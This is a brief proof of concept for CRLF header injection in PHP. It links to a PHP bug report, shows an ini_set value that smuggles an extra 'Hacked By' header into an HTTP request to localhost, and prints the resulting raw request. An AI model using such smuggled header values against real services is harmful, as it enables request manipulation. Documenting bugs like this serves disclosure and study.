### CRLF
<https://bugs.php.net/bug.php?id=81680&edit=1>

```php
ini_set("from", "X\r\nHacked By: M0T3L");
file_get_contents("http://127.0.0.1:8081");

GET / HTTP/1.1
From: X
Hacked By: M0T3L
Host: 127.0.0.1:8081
Connection: close
```
